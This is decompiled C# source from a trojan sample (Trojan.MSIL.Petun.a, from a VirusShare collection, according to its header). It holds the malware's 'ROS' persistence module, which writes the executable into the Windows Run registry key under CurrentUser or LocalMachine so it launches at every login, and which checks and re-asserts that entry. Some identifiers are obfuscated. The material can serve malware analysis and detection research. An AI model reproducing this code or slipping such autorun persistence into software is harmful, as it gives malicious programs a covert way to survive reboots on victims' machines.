// Decompiled with JetBrains decompiler
// Type: ROS
// Assembly: test, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F8202A11-8FE6-4C3C-9AC3-09E5C5A6E263
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan.MSIL.Petun.a-89054b5b55ad6e365d774d23d96908e2d5e9e95bbaa9a67e2a52bf487dd2b025.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Windows.Forms;

[StandardModule]
internal sealed class ROS
{
  public static bool get_Runonstartup(string CommandLine = null, ROS.StartupCheckCriteria Criteria = ROS.StartupCheckCriteria.Either)
  {
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\nRgzTm", true);
    string Right = Strings.Trim(Application.ExecutablePath + " " + CommandLine);
    bool runonstartup1;
    if (Criteria != ROS.StartupCheckCriteria.NameOnly)
    {
      string[] valueNames = registryKey.GetValueNames();
      int index = 0;
      while (index < valueNames.Length)
      {
        string str = valueNames[index];
        if (Operators.ConditionalCompareObjectEqual(registryKey.GetValue(str), (object) Right, false))
        {
          if (Operators.CompareString(str, MyProject.Application.Info.ProductName, false) != 0)
          {
            registryKey.DeleteValue(str);
            registryKey.SetValue(Application.ProductName, (object) Right);
          }
          runonstartup1 = true;
          break;
        }
        checked { ++index; }
      }
    }
    bool runonstartup2;
    if (Criteria != ROS.StartupCheckCriteria.PathOnly && ROS.InArray((Array) registryKey.GetValueNames(), Application.ProductName))
    {
      if (Operators.ConditionalCompareObjectNotEqual(registryKey.GetValue(Application.ProductName), (object) Right, false))
        registryKey.SetValue(Application.ProductName, (object) Right);
      runonstartup2 = true;
    }
    registryKey.Close();
    switch (Criteria)
    {
      case ROS.StartupCheckCriteria.Either:
        return runonstartup1 | runonstartup2;
      case ROS.StartupCheckCriteria.PathOnly:
        return runonstartup2;
      case ROS.StartupCheckCriteria.NameOnly:
        return runonstartup1;
      case ROS.StartupCheckCriteria.Both:
        return runonstartup1 & runonstartup2;
      default:
        return false;
    }
  }

  public static void set_Runonstartup(
    string CommandLine = null,
    ROS.StartupCheckCriteria Criteria = ROS.StartupCheckCriteria.Either,
    bool value)
  {
    RegistryKey registryKey = Operators.CompareString(Module1.qIiIT, "CurrentUser", false) != 0 ? Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true) : Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    if (value)
      registryKey.SetValue(MyProject.Application.Info.ProductName, (object) Strings.Trim(Application.ExecutablePath + " " + CommandLine));
    else if (ROS.InArray((Array) registryKey.GetValueNames(), Application.ProductName))
      registryKey.DeleteValue(Application.ProductName);
    registryKey.Close();
  }

  public static bool InArray(Array Arr, string Str)
  {
    bool flag = false;
    int num1 = Information.UBound(Arr);
    int num2 = 0;
    while (num2 <= num1)
    {
      if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet((object) Arr, new object[1]
      {
        (object) num2
      }, (string[]) null), (object) Str, false))
      {
        flag = true;
        break;
      }
      checked { ++num2; }
    }
    return flag;
  }

  public enum StartupCheckCriteria
  {
    Either,
    PathOnly,
    NameOnly,
    Both,
  }
}
